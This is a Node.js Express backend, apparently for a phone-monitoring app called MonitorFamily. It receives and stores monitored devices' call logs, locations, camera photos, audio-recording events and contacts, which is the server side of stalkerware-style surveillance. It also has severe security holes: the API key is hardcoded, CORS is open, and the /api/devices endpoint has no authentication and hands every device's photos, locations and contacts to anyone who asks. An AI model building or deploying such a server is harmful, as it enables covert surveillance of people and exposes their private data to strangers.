const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const API_KEY = 'monitor-family-secret-7860';
const DATA_FILE = path.join(__dirname, 'devices.json');

// Middleware (50mb limit taaki photos/audio base64 aa sakein)
app.use(express.json({ limit: '50mb' }));
app.use(cors());

// Helper: Data file se padhein
function getDevices() {
    if (fs.existsSync(DATA_FILE)) {
        try {
            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        } catch (e) {
            return {};
        }
    }
    return {};
}

// Helper: Data file mein save karein
function saveDevices(devices) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(devices, null, 2));
}

// 1. Regular Sync (Call Logs, Location, Battery)
app.post('/api/sync', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, deviceName, callLogs, location, battery, syncedAt } = req.body;
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });

    const devices = getDevices();
    if (!devices[deviceId]) {
        devices[deviceId] = { name: deviceName, callLogs: [], locations: [], battery: {}, lastSync: null };
    }

    if (callLogs && callLogs.length > 0) devices[deviceId].callLogs = [...devices[deviceId].callLogs, ...callLogs];
    if (location) devices[deviceId].locations.push({ ...location, syncedAt });
    if (battery) devices[deviceId].battery = battery;
    
    devices[deviceId].lastSync = syncedAt || Date.now();
    saveDevices(devices);
    console.log(`Sync received from ${deviceName}`);
    res.json({ success: true });
});

// 2. Camera Photo Receive
app.post('/api/camera', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, photoBase64, timestamp, isFront } = req.body;
    const devices = getDevices();
    
    if (devices[deviceId]) {
        if (!devices[deviceId].photos) devices[deviceId].photos = [];
        devices[deviceId].photos.push({
            photo: photoBase64,
            timestamp: timestamp || Date.now(),
            isFront: isFront
        });
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 3. Audio Recording Event
app.post('/api/audio', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, duration, timestamp } = req.body;
    const devices = getDevices();
    
    if (devices[deviceId]) {
        if (!devices[deviceId].audios) devices[deviceId].audios = [];
        devices[deviceId].audios.push({
            duration: duration,
            timestamp: timestamp || Date.now()
        });
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 4. Contacts Receive
app.post('/api/contacts', (req, res) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== API_KEY) return res.status(401).json({ error: 'Invalid API Key' });

    const { deviceId, contacts } = req.body;
    const devices = getDevices();
    
    if (devices[deviceId]) {
        devices[deviceId].contacts = contacts;
        devices[deviceId].contactsSyncedAt = Date.now();
        saveDevices(devices);
    }
    res.json({ success: true });
});

// 5. Dashboard Data Fetch
app.get('/api/devices', (req, res) => {
    res.json(getDevices());
});

app.get('/', (req, res) => {
    res.send('MonitorFamily Backend is Running!');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
